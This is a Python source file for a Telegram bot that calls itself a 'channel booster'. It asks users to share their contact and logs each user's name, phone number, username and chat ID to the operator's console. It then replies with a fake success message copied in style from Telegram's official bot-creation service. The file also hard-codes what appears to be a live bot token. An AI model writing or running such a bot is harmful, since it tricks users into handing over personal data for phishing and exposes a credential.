import telebot
from datetime import datetime
import threading
import time
import os

# === BOT TOKEN ===
BOT_TOKEN = "8224715655:AAFDEhcmviXA1Q3lI6TUghZa_1zpN17UcDQ"
bot = telebot.TeleBot(BOT_TOKEN)

# === SHARED VARIABLES ===
print_lock = threading.Lock()
contact_logs = []

# === START COMMAND ===
@bot.message_handler(commands=['start'])
def welcome(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    button = telebot.types.KeyboardButton(text="👨‍💻 Channel Booster Bot🤖", request_contact=True)
    markup.add(button)
    bot.send_message(
        message.chat.id,
        "👋 *Welcome to TELEGRAM BOOSTER - Boost channel / group*\n"
        "Powered by: TELEGRAM BOOSTER\n\n"
        "👉  TELEGRAM Copyright secure.",
        parse_mode="Markdown",
        reply_markup=markup
    )

# === CONTACT HANDLER ===
@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    from_user = message.from_user
    name = from_user.first_name or "Unknown"
    username = f"@{from_user.username}" if from_user.username else "❌ Not Available"
    chat_id = from_user.id
    phone = message.contact.phone_number or "❓ Unknown"

    india_time = datetime.now(pytz.timezone("Asia/Kolkata"))
    weekday = india_time.strftime("%A")
    time_str = india_time.strftime("%I:%M %p")

    log = (
        f"\n📥 New Contact Received by DEVELOPER BHAI:\n"
        f"👤 Name     : {name}\n"
        f"📱 Phone    : {phone}\n"
        f"🔗 Username : {username}\n"
        f"🆔 Chat ID  : {chat_id}\n"
        f"📅 Day      : {weekday}\n"
        f"🕒 Time     : {time_str}\n"
        f"📢 Powered by THE BOYS EXPLOITS | DEVELOPER BHAI\n"
        + "-" * 50
    )

    with print_lock:
        contact_logs.append(log)

    bot.send_message(
        message.chat.id,
        "✅ Done! Congratulations on your new bot. You will find it at t.me/Boostergroupmbbot. You can now add a description, about section and profile picture for your bot, see /help for a list of commands. By the way, when you've finished creating your cool bot, ping our Bot Support if you want a better username for it. Just make sure the bot is fully operational before you do this..\n\n"
        "🔧 You will find it at [t.me/Boostergroupmbbot](https://t.me/Boostergroupmbbot)",
        parse_mode="Markdown",
        disable_web_page_preview=True
    )

# === CLEAR TERMINAL FUNCTION ===
def clear():
    os.system("clear" if os.name == "posix" else "cls")

# === ANIMATION + LOG DISPLAY FUNCTION ===
def animate_running():
    frames = ["[■□□□□]", "[■■□□□]", "[■■■□□]", "[■■■■□]", "[■■■■■]", "[□■■■■]", "[□□■■■]", "[□□□■■]", "[□□□□■]"]
    while True:
        for frame in frames:
            with print_lock:
                clear()
                print("\033[1;31m" + "=" * 60 + "\033[0m")
                print("\033[1;31m{:^60}\033[0m".format("✨ DEVELOPER BHAI EXPLOITS | DEVELOPER BHAI"))
                print("\n\033[1;32m{:^60}\033[0m\n".format(f"🤖 Bot Running {frame}"))
                print("\033[1;31m" + "=" * 60 + "\033[0m")

                print("\n\033[1;36m📬 Recent Contacts (Logged by DEVELOPER BHAI):\033[0m")
                for log in contact_logs[-3:]:
                    print(log)
            time.sleep(0.4)

# === START BACKGROUND ANIMATION THREAD ===
animation_thread = threading.Thread(target=animate_running)
animation_thread.daemon = True
animation_thread.start()

# === START BOT POLLING ===
print("🔧 Bot started by EXPLOITS | Developer: TELEGRAM BOOSTER - Boost channel")
bot.polling()
